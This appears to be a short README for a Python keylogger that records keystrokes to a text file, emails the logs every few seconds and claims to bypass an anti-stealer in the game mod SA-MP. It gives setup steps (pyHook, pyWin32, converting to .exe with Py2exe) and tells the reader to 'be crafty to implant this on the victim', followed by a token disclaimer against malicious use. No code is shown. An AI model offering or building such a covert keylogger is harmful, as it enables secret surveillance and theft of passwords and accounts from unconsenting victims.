# Keylogger-Email
This keylogger records keystrokes and dump them in the .txt file and sends the logs in an e-mail every 'n' seconds. It also bypasses the anti-stealer for SA-MP.
You'll need pyHook and pyWin32 to run the .pyw file. However, you may convert the .pyw file to .exe using Py2exe. Be crafty to implant this on the victim.
Don't use this for malicious purpose.
